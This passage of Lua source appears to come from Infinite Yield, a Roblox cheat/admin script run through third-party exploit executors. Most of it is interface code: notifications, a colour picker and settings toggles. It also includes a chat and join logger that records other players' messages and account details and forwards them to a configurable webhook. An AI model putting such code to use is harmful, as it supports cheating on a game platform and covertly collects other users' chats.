		WayPoints = {}
	
		if #AllWaypoints > 0 then
			for i = 1, #AllWaypoints do
				if not AllWaypoints[i].GAME or AllWaypoints[i].GAME == PlaceId then
					WayPoints[#WayPoints + 1] = {NAME = AllWaypoints[i].NAME, COORD = {AllWaypoints[i].COORD[1], AllWaypoints[i].COORD[2], AllWaypoints[i].COORD[3]}, GAME = AllWaypoints[i].GAME}
				end
			end
		end
	
		if type(binds) ~= "table" then binds = {} end
	
		if type(PluginsTable) == "table" then
			for i = #PluginsTable, 1, -1 do
				if string.sub(PluginsTable[i], -3) ~= ".iy" then
					table.remove(PluginsTable, i)
				end
			end
		end
	
		function Time()
			local HOUR = math.floor((tick() % 86400) / 3600)
			local MINUTE = math.floor((tick() % 3600) / 60)
			local SECOND = math.floor(tick() % 60)
			local AP = HOUR > 11 and 'PM' or 'AM'
			HOUR = (HOUR % 12 == 0 and 12 or HOUR % 12)
			HOUR = HOUR < 10 and '0' .. HOUR or HOUR
			MINUTE = MINUTE < 10 and '0' .. MINUTE or MINUTE
			SECOND = SECOND < 10 and '0' .. SECOND or SECOND
			return HOUR .. ':' .. MINUTE .. ':' .. SECOND .. ' ' .. AP
		end
	
		PrefixBox.Text = prefix
		local SettingsOpen = false
		local isHidden = false
	
		if StayOpen == false then
			On.BackgroundTransparency = 1
		else
			On.BackgroundTransparency = 0
		end
	
		if logsEnabled then
			Toggle.Text = 'Enabled'
		else
			Toggle.Text = 'Disabled'
		end
	
		if jLogsEnabled then
			Toggle_2.Text = 'Enabled'
		else
			Toggle_2.Text = 'Disabled'
		end
	
		function maximizeHolder()
			if StayOpen == false then
				Holder:TweenPosition(UDim2.new(1, Holder.Position.X.Offset, 1, -220), "InOut", "Quart", 0.2, true, nil)
			end
		end
	
		minimizeNum = -20
		function minimizeHolder()
			if StayOpen == false then
				Holder:TweenPosition(UDim2.new(1, Holder.Position.X.Offset, 1, minimizeNum), "InOut", "Quart", 0.5, true, nil)
			end
		end
	
		function cmdbarHolder()
			if StayOpen == false then
				Holder:TweenPosition(UDim2.new(1, Holder.Position.X.Offset, 1, -45), "InOut", "Quart", 0.5, true, nil)
			end
		end
	
		pinNotification = nil
		local notifyCount = 0
		function notify(text,text2,length)
			task.spawn(function()
				local LnotifyCount = notifyCount+1
				local notificationPinned = false
				notifyCount = notifyCount+1
				if pinNotification then pinNotification:Disconnect() end
				pinNotification = PinButton.MouseButton1Click:Connect(function()
					task.spawn(function()
						pinNotification:Disconnect()
						notificationPinned = true
						Title_2.BackgroundTransparency = 1
						wait(0.5)
						Title_2.BackgroundTransparency = 0
					end)
				end)
				Notification:TweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, 0), "InOut", "Quart", 0.5, true, nil)
				wait(0.6)
				local closepressed = false
				if text2 then
					Title_2.Text = text
					Text_2.Text = text2
				else
					Title_2.Text = 'Notification'
					Text_2.Text = text
				end
				Notification:TweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, -100), "InOut", "Quart", 0.5, true, nil)
				CloseButton.MouseButton1Click:Connect(function()
					Notification:TweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, 0), "InOut", "Quart", 0.5, true, nil)
					closepressed = true
					pinNotification:Disconnect()
				end)
				if length and isNumber(length) then
					wait(length)
				else
					wait(10)
				end
				if LnotifyCount == notifyCount then
					if closepressed == false and notificationPinned == false then
						pinNotification:Disconnect()
						Notification:TweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, 0), "InOut", "Quart", 0.5, true, nil)
					end
					notifyCount = 0
				end
			end)
		end
	
		local lastMessage = nil
		local lastLabel = nil
		local dupeCount = 1
		function CreateLabel(Name, Text)
			if lastMessage == Name..Text then
				dupeCount = dupeCount+1
				lastLabel.Text = Time()..' - ['..Name..']: '..Text..' (x'..dupeCount..')'
			else
				if dupeCount > 1 then dupeCount = 1 end
				if #scroll_2:GetChildren() >= 2546 then
					scroll_2:ClearAllChildren()
				end
				local alls = 0
				for i,v in pairs(scroll_2:GetChildren()) do
					if v then
						alls = v.Size.Y.Offset + alls
					end
					if not v then
						alls = 0
					end
				end
				local tl = Instance.new('TextLabel')
				lastMessage = Name..Text
				lastLabel = tl
				tl.Name = Name
				tl.Parent = scroll_2
				tl.ZIndex = 10
				tl.RichText = true
				tl.Text = Time().." - ["..Name.."]: "..Text
				tl.Text = tl.ContentText
				tl.Size = UDim2.new(0,322,0,84)
				tl.BackgroundTransparency = 1
				tl.BorderSizePixel = 0
				tl.Font = "SourceSans"
				tl.Position = UDim2.new(-1,0,0,alls)
				tl.TextTransparency = 1
				tl.TextScaled = false
				tl.TextSize = 14
				tl.TextWrapped = true
				tl.TextXAlignment = "Left"
				tl.TextYAlignment = "Top"
				tl.TextColor3 = currentText1
				tl.Size = UDim2.new(0,322,0,tl.TextBounds.Y)
				table.insert(text1,tl)
				scroll_2.CanvasSize = UDim2.new(0,0,0,alls+tl.TextBounds.Y)
				scroll_2.CanvasPosition = Vector2.new(0,scroll_2.CanvasPosition.Y+tl.TextBounds.Y)
				tl:TweenPosition(UDim2.new(0,3,0,alls), 'In', 'Quint', 0.5)
				TweenService:Create(tl, TweenInfo.new(1.25, Enum.EasingStyle.Linear), { TextTransparency = 0 }):Play()
			end
		end
	
		function CreateJoinLabel(plr,ID)
			if #scroll_3:GetChildren() >= 2546 then
				scroll_3:ClearAllChildren()
			end
			local infoFrame = Instance.new("Frame")
			local info1 = Instance.new("TextLabel")
			local info2 = Instance.new("TextLabel")
			local ImageLabel_3 = Instance.new("ImageLabel")
			infoFrame.Name = randomString()
			infoFrame.Parent = scroll_3
			infoFrame.BackgroundColor3 = Color3.new(1, 1, 1)
			infoFrame.BackgroundTransparency = 1
			infoFrame.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
			infoFrame.Size = UDim2.new(1, 0, 0, 50)
			info1.Name = randomString()
			info1.Parent = infoFrame
			info1.BackgroundTransparency = 1
			info1.BorderSizePixel = 0
			info1.Position = UDim2.new(0, 45, 0, 0)
			info1.Size = UDim2.new(0, 135, 1, 0)
			info1.ZIndex = 10
			info1.Font = Enum.Font.SourceSans
			info1.FontSize = Enum.FontSize.Size14
			info1.Text = "Username: "..plr.Name.."\nJoined Server: "..Time()
			info1.TextColor3 = Color3.new(1, 1, 1)
			info1.TextWrapped = true
			info1.TextXAlignment = Enum.TextXAlignment.Left
			info2.Name = randomString()
			info2.Parent = infoFrame
			info2.BackgroundTransparency = 1
			info2.BorderSizePixel = 0
			info2.Position = UDim2.new(0, 185, 0, 0)
			info2.Size = UDim2.new(0, 140, 1, -5)
			info2.ZIndex = 10
			info2.Font = Enum.Font.SourceSans
			info2.FontSize = Enum.FontSize.Size14
			info2.Text = "User ID: "..ID.."\nAccount Age: "..plr.AccountAge.."\nJoined Roblox: Loading..."
			info2.TextColor3 = Color3.new(1, 1, 1)
			info2.TextWrapped = true
			info2.TextXAlignment = Enum.TextXAlignment.Left
			info2.TextYAlignment = Enum.TextYAlignment.Center
			ImageLabel_3.Parent = infoFrame
			ImageLabel_3.BackgroundTransparency = 1
			ImageLabel_3.BorderSizePixel = 0
			ImageLabel_3.Size = UDim2.new(0, 45, 1, 0)
			ImageLabel_3.Image = Players:GetUserThumbnailAsync(ID, Enum.ThumbnailType.AvatarThumbnail, Enum.ThumbnailSize.Size420x420)
			scroll_3.CanvasSize = UDim2.new(0, 0, 0, listlayout.AbsoluteContentSize.Y)
			scroll_3.CanvasPosition = Vector2.new(0,scroll_2.CanvasPosition.Y+infoFrame.AbsoluteSize.Y)
			wait()
			local user = game:HttpGet("https://users.roblox.com/v1/users/"..ID)
			local json = HttpService:JSONDecode(user)
			local date = json["created"]:sub(1,10)
			local splitDates = string.split(date,"-")
			info2.Text = string.gsub(info2.Text, "Loading...",splitDates[2].."/"..splitDates[3].."/"..splitDates[1])
		end
	
		IYMouse.KeyDown:Connect(function(Key)
			if (Key==prefix) then
				RunService.RenderStepped:Wait()
				Cmdbar:CaptureFocus()
				maximizeHolder()
			end
		end)
	
		local lastMinimizeReq = 0
		Holder.MouseEnter:Connect(function()
			lastMinimizeReq = 0
			maximizeHolder()
		end)
	
		Holder.MouseLeave:Connect(function()
			if not Cmdbar:IsFocused() then
				local reqTime = tick()
				lastMinimizeReq = reqTime
				wait(1)
				if lastMinimizeReq ~= reqTime then return end
				if not Cmdbar:IsFocused() then
					minimizeHolder()
				end
			end
		end)
	
		function updateColors(color,ctype)
			if ctype == shade1 then
				for i,v in pairs(shade1) do
					v.BackgroundColor3 = color
				end
				currentShade1 = color
			elseif ctype == shade2 then
				for i,v in pairs(shade2) do
					v.BackgroundColor3 = color
				end
				currentShade2 = color
			elseif ctype == shade3 then
				for i,v in pairs(shade3) do
					v.BackgroundColor3 = color
				end
				currentShade3 = color
			elseif ctype == text1 then
				for i,v in pairs(text1) do
					v.TextColor3 = color
					if v:IsA("TextBox") then
						v.PlaceholderColor3 = color	
					end
				end
				currentText1 = color
			elseif ctype == text2 then
				for i,v in pairs(text2) do
					v.TextColor3 = color
				end
				currentText2 = color
			elseif ctype == scroll then
				for i,v in pairs(scroll) do
					v.ScrollBarImageColor3 = color
				end
				currentScroll = color
			end
		end
	
		local colorpickerOpen = false
		ColorsButton.MouseButton1Click:Connect(function()
			cache_currentShade1 = currentShade1
			cache_currentShade2 = currentShade2
			cache_currentShade3 = currentShade3
			cache_currentText1 = currentText1
			cache_currentText2 = currentText2
			cache_currentScroll = currentScroll
			if not colorpickerOpen then
				colorpickerOpen = true
				picker = game:GetObjects("rbxassetid://4908465318")[1]
				picker.Name = randomString()
				picker.Parent = ScaledHolder
	
				local ColorPicker do
					ColorPicker = {}
	
					ColorPicker.new = function()
						local newMt = setmetatable({},{})
	
						local pickerGui = picker.ColorPicker
						local pickerTopBar = pickerGui.TopBar
						local pickerExit = pickerTopBar.Exit
						local pickerFrame = pickerGui.Content
						local colorSpace = pickerFrame.ColorSpaceFrame.ColorSpace
						local colorStrip = pickerFrame.ColorStrip
						local previewFrame = pickerFrame.Preview
						local basicColorsFrame = pickerFrame.BasicColors
						local customColorsFrame = pickerFrame.CustomColors
						local defaultButton = pickerFrame.Default
						local cancelButton = pickerFrame.Cancel
						local shade1Button = pickerFrame.Shade1
						local shade2Button = pickerFrame.Shade2
						local shade3Button = pickerFrame.Shade3
						local text1Button = pickerFrame.Text1
						local text2Button = pickerFrame.Text2
						local scrollButton = pickerFrame.Scroll
	
						local colorScope = colorSpace.Scope
						local colorArrow = pickerFrame.ArrowFrame.Arrow
	
						local hueInput = pickerFrame.Hue.Input
						local satInput = pickerFrame.Sat.Input
						local valInput = pickerFrame.Val.Input
	
						local redInput = pickerFrame.Red.Input
						local greenInput = pickerFrame.Green.Input
						local blueInput = pickerFrame.Blue.Input
	
						local mouse = IYMouse
	
						local hue,sat,val = 0,0,1
						local red,green,blue = 1,1,1
						local chosenColor = Color3.new(0,0,0)
	
						local basicColors = {Color3.new(0,0,0),Color3.new(0.66666668653488,0,0),Color3.new(0,0.33333334326744,0),Color3.new(0.66666668653488,0.33333334326744,0),Color3.new(0,0.66666668653488,0),Color3.new(0.66666668653488,0.66666668653488,0),Color3.new(0,1,0),Color3.new(0.66666668653488,1,0),Color3.new(0,0,0.49803924560547),Color3.new(0.66666668653488,0,0.49803924560547),Color3.new(0,0.33333334326744,0.49803924560547),Color3.new(0.66666668653488,0.33333334326744,0.49803924560547),Color3.new(0,0.66666668653488,0.49803924560547),Color3.new(0.66666668653488,0.66666668653488,0.49803924560547),Color3.new(0,1,0.49803924560547),Color3.new(0.66666668653488,1,0.49803924560547),Color3.new(0,0,1),Color3.new(0.66666668653488,0,1),Color3.new(0,0.33333334326744,1),Color3.new(0.66666668653488,0.33333334326744,1),Color3.new(0,0.66666668653488,1),Color3.new(0.66666668653488,0.66666668653488,1),Color3.new(0,1,1),Color3.new(0.66666668653488,1,1),Color3.new(0.33333334326744,0,0),Color3.new(1,0,0),Color3.new(0.33333334326744,0.33333334326744,0),Color3.new(1,0.33333334326744,0),Color3.new(0.33333334326744,0.66666668653488,0),Color3.new(1,0.66666668653488,0),Color3.new(0.33333334326744,1,0),Color3.new(1,1,0),Color3.new(0.33333334326744,0,0.49803924560547),Color3.new(1,0,0.49803924560547),Color3.new(0.33333334326744,0.33333334326744,0.49803924560547),Color3.new(1,0.33333334326744,0.49803924560547),Color3.new(0.33333334326744,0.66666668653488,0.49803924560547),Color3.new(1,0.66666668653488,0.49803924560547),Color3.new(0.33333334326744,1,0.49803924560547),Color3.new(1,1,0.49803924560547),Color3.new(0.33333334326744,0,1),Color3.new(1,0,1),Color3.new(0.33333334326744,0.33333334326744,1),Color3.new(1,0.33333334326744,1),Color3.new(0.33333334326744,0.66666668653488,1),Color3.new(1,0.66666668653488,1),Color3.new(0.33333334326744,1,1),Color3.new(1,1,1)}
						local customColors = {}
	
						dragGUI(picker)
	
						local function updateColor(noupdate)
							local relativeX,relativeY,relativeStripY = 219 - hue*219, 199 - sat*199, 199 - val*199
							local hsvColor = Color3.fromHSV(hue,sat,val)
	
							if noupdate == 2 or not noupdate then
								hueInput.Text = tostring(math.ceil(359*hue))
								satInput.Text = tostring(math.ceil(255*sat))
								valInput.Text = tostring(math.floor(255*val))
							end
							if noupdate == 1 or not noupdate then
								redInput.Text = tostring(math.floor(255*red))
								greenInput.Text = tostring(math.floor(255*green))
								blueInput.Text = tostring(math.floor(255*blue))
							end
	
							chosenColor = Color3.new(red,green,blue)
	
							colorScope.Position = UDim2.new(0,relativeX-9,0,relativeY-9)
							colorStrip.ImageColor3 = Color3.fromHSV(hue,sat,1)
							colorArrow.Position = UDim2.new(0,-2,0,relativeStripY-4)
							previewFrame.BackgroundColor3 = chosenColor
	
							newMt.Color = chosenColor
							if newMt.Changed then newMt:Changed(chosenColor) end
						end
	
						local function colorSpaceInput()
							local relativeX = mouse.X - colorSpace.AbsolutePosition.X
							local relativeY = mouse.Y - colorSpace.AbsolutePosition.Y
	
							if relativeX < 0 then relativeX = 0 elseif relativeX > 219 then relativeX = 219 end
							if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end
	
							hue = (219 - relativeX)/219
							sat = (199 - relativeY)/199
	
							local hsvColor = Color3.fromHSV(hue,sat,val)
							red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
	
							updateColor()
						end
	
						local function colorStripInput()
							local relativeY = mouse.Y - colorStrip.AbsolutePosition.Y
	
							if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end	
	
							val = (199 - relativeY)/199
	
							local hsvColor = Color3.fromHSV(hue,sat,val)
							red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
	
							updateColor()
						end
	
						local function hookButtons(frame,func)
							frame.ArrowFrame.Up.InputBegan:Connect(function(input)
								if input.UserInputType == Enum.UserInputType.MouseMovement then
									frame.ArrowFrame.Up.BackgroundTransparency = 0.5
								elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
									local releaseEvent,runEvent
	
									local startTime = tick()
									local pressing = true
									local startNum = tonumber(frame.Text)
	
									if not startNum then return end
	
									releaseEvent = UserInputService.InputEnded:Connect(function(input)
										if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
										releaseEvent:Disconnect()
										pressing = false
									end)
	
									startNum = startNum + 1
									func(startNum)
									while pressing do
										if tick()-startTime > 0.3 then
											startNum = startNum + 1
											func(startNum)
										end
										wait(0.1)
									end
								end
							end)
	
							frame.ArrowFrame.Up.InputEnded:Connect(function(input)
								if input.UserInputType == Enum.UserInputType.MouseMovement then
									frame.ArrowFrame.Up.BackgroundTransparency = 1
								end
							end)
	
							frame.ArrowFrame.Down.InputBegan:Connect(function(input)
								if input.UserInputType == Enum.UserInputType.MouseMovement then
									frame.ArrowFrame.Down.BackgroundTransparency = 0.5
								elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
									local releaseEvent,runEvent
	
									local startTime = tick()
									local pressing = true
									local startNum = tonumber(frame.Text)
	
									if not startNum then return end
	
									releaseEvent = UserInputService.InputEnded:Connect(function(input)
										if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
										releaseEvent:Disconnect()
										pressing = false
									end)
	
									startNum = startNum - 1
									func(startNum)
									while pressing do
										if tick()-startTime > 0.3 then
											startNum = startNum - 1
											func(startNum)
										end
										wait(0.1)
									end
								end
							end)
	
							frame.ArrowFrame.Down.InputEnded:Connect(function(input)
								if input.UserInputType == Enum.UserInputType.MouseMovement then
									frame.ArrowFrame.Down.BackgroundTransparency = 1
								end
							end)
						end
	
						colorSpace.InputBegan:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseButton1 then
								local releaseEvent,mouseEvent
	
								releaseEvent = UserInputService.InputEnded:Connect(function(input)
									if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
									releaseEvent:Disconnect()
									mouseEvent:Disconnect()
								end)
	
								mouseEvent = UserInputService.InputChanged:Connect(function(input)
									if input.UserInputType == Enum.UserInputType.MouseMovement then
										colorSpaceInput()
									end
								end)
	
								colorSpaceInput()
							end
						end)
	
						colorStrip.InputBegan:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseButton1 then
								local releaseEvent,mouseEvent
	
								releaseEvent = UserInputService.InputEnded:Connect(function(input)
									if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
									releaseEvent:Disconnect()
									mouseEvent:Disconnect()
								end)
	
								mouseEvent = UserInputService.InputChanged:Connect(function(input)
									if input.UserInputType == Enum.UserInputType.MouseMovement then
										colorStripInput()
									end
								end)
	
								colorStripInput()
							end
						end)
	
						local function updateHue(str)
							local num = tonumber(str)
							if num then
								hue = math.clamp(math.floor(num),0,359)/359
								local hsvColor = Color3.fromHSV(hue,sat,val)
								red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
								hueInput.Text = tostring(hue*359)
								updateColor(1)
							end
						end
						hueInput.FocusLost:Connect(function() updateHue(hueInput.Text) end) hookButtons(hueInput,updateHue)
	
						local function updateSat(str)
							local num = tonumber(str)
							if num then
								sat = math.clamp(math.floor(num),0,255)/255
								local hsvColor = Color3.fromHSV(hue,sat,val)
								red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
								satInput.Text = tostring(sat*255)
								updateColor(1)
							end
						end
						satInput.FocusLost:Connect(function() updateSat(satInput.Text) end) hookButtons(satInput,updateSat)
	
						local function updateVal(str)
							local num = tonumber(str)
							if num then
								val = math.clamp(math.floor(num),0,255)/255
								local hsvColor = Color3.fromHSV(hue,sat,val)
								red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
								valInput.Text = tostring(val*255)
								updateColor(1)
							end
						end
						valInput.FocusLost:Connect(function() updateVal(valInput.Text) end) hookButtons(valInput,updateVal)
	
						local function updateRed(str)
							local num = tonumber(str)
							if num then
								red = math.clamp(math.floor(num),0,255)/255
								local newColor = Color3.new(red,green,blue)
								hue,sat,val = Color3.toHSV(newColor)
								redInput.Text = tostring(red*255)
								updateColor(2)
							end
						end
						redInput.FocusLost:Connect(function() updateRed(redInput.Text) end) hookButtons(redInput,updateRed)
	
						local function updateGreen(str)
							local num = tonumber(str)
							if num then
								green = math.clamp(math.floor(num),0,255)/255
								local newColor = Color3.new(red,green,blue)
								hue,sat,val = Color3.toHSV(newColor)
								greenInput.Text = tostring(green*255)
								updateColor(2)
							end
						end
						greenInput.FocusLost:Connect(function() updateGreen(greenInput.Text) end) hookButtons(greenInput,updateGreen)
	
						local function updateBlue(str)
							local num = tonumber(str)
							if num then
								blue = math.clamp(math.floor(num),0,255)/255
								local newColor = Color3.new(red,green,blue)
								hue,sat,val = Color3.toHSV(newColor)
								blueInput.Text = tostring(blue*255)
								updateColor(2)
							end
						end
						blueInput.FocusLost:Connect(function() updateBlue(blueInput.Text) end) hookButtons(blueInput,updateBlue)
	
						local colorChoice = Instance.new("TextButton")
						colorChoice.Name = "Choice"
						colorChoice.Size = UDim2.new(0,25,0,18)
						colorChoice.BorderColor3 = Color3.new(96/255,96/255,96/255)
						colorChoice.Text = ""
						colorChoice.AutoButtonColor = false
						colorChoice.ZIndex = 10
	
						local row = 0
						local column = 0
						for i,v in pairs(basicColors) do
							local newColor = colorChoice:Clone()
							newColor.BackgroundColor3 = v
							newColor.Position = UDim2.new(0,1 + 30*column,0,21 + 23*row)
	
							newColor.MouseButton1Click:Connect(function()
								red,green,blue = v.r,v.g,v.b
								local newColor = Color3.new(red,green,blue)
								hue,sat,val = Color3.toHSV(newColor)
								updateColor()
							end)	
	
							newColor.Parent = basicColorsFrame
							column = column + 1
							if column == 6 then row = row + 1 column = 0 end
						end
	
						row = 0
						column = 0
						for i = 1,12 do
							local color = customColors[i] or Color3.new(0,0,0)
							local newColor = colorChoice:Clone()
							newColor.BackgroundColor3 = color
							newColor.Position = UDim2.new(0,1 + 30*column,0,20 + 23*row)
	
							newColor.MouseButton1Click:Connect(function()
								local curColor = customColors[i] or Color3.new(0,0,0)
								red,green,blue = curColor.r,curColor.g,curColor.b
								hue,sat,val = Color3.toHSV(curColor)
								updateColor()
							end)
	
							newColor.MouseButton2Click:Connect(function()
								customColors[i] = chosenColor
								newColor.BackgroundColor3 = chosenColor
							end)
	
							newColor.Parent = customColorsFrame
							column = column + 1
							if column == 6 then row = row + 1 column = 0 end
						end
	
						shade1Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,shade1) end end)
						shade1Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade1Button.BackgroundTransparency = 0.4 end end)
						shade1Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade1Button.BackgroundTransparency = 0 end end)
	
						shade2Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,shade2) end end)
						shade2Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade2Button.BackgroundTransparency = 0.4 end end)
						shade2Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade2Button.BackgroundTransparency = 0 end end)
	
						shade3Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,shade3) end end)
						shade3Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade3Button.BackgroundTransparency = 0.4 end end)
						shade3Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade3Button.BackgroundTransparency = 0 end end)
	
						text1Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,text1) end end)
						text1Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then text1Button.BackgroundTransparency = 0.4 end end)
						text1Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then text1Button.BackgroundTransparency = 0 end end)
	
						text2Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,text2) end end)
						text2Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then text2Button.BackgroundTransparency = 0.4 end end)
						text2Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then text2Button.BackgroundTransparency = 0 end end)
	
						scrollButton.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,scroll) end end)
						scrollButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then scrollButton.BackgroundTransparency = 0.4 end end)
						scrollButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then scrollButton.BackgroundTransparency = 0 end end)
	
						cancelButton.MouseButton1Click:Connect(function() if newMt.Cancel then newMt:Cancel() end end)
						cancelButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then cancelButton.BackgroundTransparency = 0.4 end end)
						cancelButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then cancelButton.BackgroundTransparency = 0 end end)
	
						defaultButton.MouseButton1Click:Connect(function() if newMt.Default then newMt:Default() end end)
						defaultButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then defaultButton.BackgroundTransparency = 0.4 end end)
						defaultButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then defaultButton.BackgroundTransparency = 0 end end)
	
						pickerExit.MouseButton1Click:Connect(function()
							picker:TweenPosition(UDim2.new(0.5, -219, 0, -500), "InOut", "Quart", 0.5, true, nil)
						end)
	
						updateColor()
	
						newMt.SetColor = function(self,color)
							red,green,blue = color.r,color.g,color.b
							hue,sat,val = Color3.toHSV(color)
							updateColor()
						end
	
						return newMt
					end
				end
	
				picker:TweenPosition(UDim2.new(0.5, -219, 0, 100), "InOut", "Quart", 0.5, true, nil)
	
				local Npicker = ColorPicker.new()
				Npicker.Confirm = function(self,color,ctype) updateColors(color,ctype) wait() updatesaves() end
				Npicker.Cancel = function(self)
					updateColors(cache_currentShade1,shade1)
					updateColors(cache_currentShade2,shade2)
					updateColors(cache_currentShade3,shade3)
					updateColors(cache_currentText1,text1)
					updateColors(cache_currentText2,text2)
					updateColors(cache_currentScroll,scroll)
					wait()
					updatesaves()
				end
				Npicker.Default = function(self)
					updateColors(Color3.fromRGB(36, 36, 37),shade1)
					updateColors(Color3.fromRGB(46, 46, 47),shade2)
					updateColors(Color3.fromRGB(78, 78, 79),shade3)
					updateColors(Color3.new(1, 1, 1),text1)
					updateColors(Color3.new(0, 0, 0),text2)
					updateColors(Color3.fromRGB(78,78,79),scroll)
					wait()
					updatesaves()
				end
			else
				picker:TweenPosition(UDim2.new(0.5, -219, 0, 100), "InOut", "Quart", 0.5, true, nil)
			end
		end)
	
	
		SettingsButton.MouseButton1Click:Connect(function()
			if SettingsOpen == false then SettingsOpen = true
				Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.5, true, nil)
				CMDsF.Visible = false
			else SettingsOpen = false
				CMDsF.Visible = true
				Settings:TweenPosition(UDim2.new(0, 0, 0, 220), "InOut", "Quart", 0.5, true, nil)
			end
		end)
	
		On.MouseButton1Click:Connect(function()
			if isHidden == false then
				if StayOpen == false then
					StayOpen = true
					On.BackgroundTransparency = 0
				else
					StayOpen = false
					On.BackgroundTransparency = 1
				end
				updatesaves()
			end
		end)
	
		Clear.MouseButton1Down:Connect(function()
			for _, child in pairs(scroll_2:GetChildren()) do
				child:Destroy()
			end
			scroll_2.CanvasSize = UDim2.new(0, 0, 0, 10)
		end)
	
		Clear_2.MouseButton1Down:Connect(function()
			for _, child in pairs(scroll_3:GetChildren()) do
				child:Destroy()
			end
			scroll_3.CanvasSize = UDim2.new(0, 0, 0, 10)
		end)
	
		Toggle.MouseButton1Down:Connect(function()
			if logsEnabled then
				logsEnabled = false
				Toggle.Text = 'Disabled'
				updatesaves()
			else
				logsEnabled = true
				Toggle.Text = 'Enabled'
				updatesaves()
			end
		end)
	
		Toggle_2.MouseButton1Down:Connect(function()
			if jLogsEnabled then
				jLogsEnabled = false
				Toggle_2.Text = 'Disabled'
				updatesaves()
			else
				jLogsEnabled = true
				Toggle_2.Text = 'Enabled'
				updatesaves()
			end
		end)
	
		selectChat.MouseButton1Down:Connect(function()
			join.Visible = false
			chat.Visible = true
			table.remove(shade3,table.find(shade3,selectChat))
			table.remove(shade2,table.find(shade2,selectJoin))
			table.insert(shade2,selectChat)
			table.insert(shade3,selectJoin)
			selectJoin.BackgroundColor3 = currentShade3
			selectChat.BackgroundColor3 = currentShade2
		end)
	
		selectJoin.MouseButton1Down:Connect(function()
			chat.Visible = false
			join.Visible = true	
			table.remove(shade3,table.find(shade3,selectJoin))
			table.remove(shade2,table.find(shade2,selectChat))
			table.insert(shade2,selectJoin)
			table.insert(shade3,selectChat)
			selectChat.BackgroundColor3 = currentShade3
			selectJoin.BackgroundColor3 = currentShade2
		end)
	
		if not writefileExploit() then
			notify("Saves", "Your exploit does not support read/write file. Your settings will not save.")
		end
	
		avatarcache = {}
		function sendChatWebhook(player, message)
			if httprequest and vtype(logsWebhook, "string") then
				local id = player.UserId
				local avatar = avatarcache[id]
				if not avatar then
					local d = HttpService:JSONDecode(httprequest({
						Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. id .. "&size=420x420&format=Png&isCircular=false",
						Method = "GET"
					}).Body)["data"]
					avatar = d and d[1].state == "Completed" and d[1].imageUrl or "https://files.catbox.moe/i968v2.jpg"
					avatarcache[id] = avatar
				end
				local log = HttpService:JSONEncode({
					content = message,
					avatar_url = avatar,
					username = formatUsername(player),
					allowed_mentions = {parse = {}}
				})
				httprequest({
					Url = logsWebhook,
					Method = "POST",
					Headers = {["Content-Type"] = "application/json"},
					Body = log
				})
			end
		end
	
		ChatLog = function(player)
			player.Chatted:Connect(function(message)
				if logsEnabled == true then
					CreateLabel(player.Name, message)
					sendChatWebhook(player, message)
				end
			end)
		end
	
		JoinLog = function(plr)
			if jLogsEnabled == true then
				CreateJoinLabel(plr,plr.UserId)
			end
		end
	
		CleanFileName = function(name)
			return tostring(name):gsub("[*\\?:<>|]+", ""):sub(1, 175)
		end
	
		SaveChatlogs.MouseButton1Down:Connect(function()
			if writefileExploit() then
				if #scroll_2:GetChildren() > 0 then
					notify("Loading",'Hold on a sec')
					local placeName = CleanFileName(MarketplaceService:GetProductInfo(PlaceId).Name)
					local writelogs = '-- Infinite Yield Chat logs for "'..placeName..'"\n'
					for _, child in pairs(scroll_2:GetChildren()) do
						writelogs = writelogs..'\n'..child.Text
					end
					local writelogsFile = tostring(writelogs)
					local fileext = 0
					local function nameFile()
						local file
						pcall(function() file = readfile(placeName..' Chat Logs ('..fileext..').txt') end)
						if file then
							fileext = fileext+1
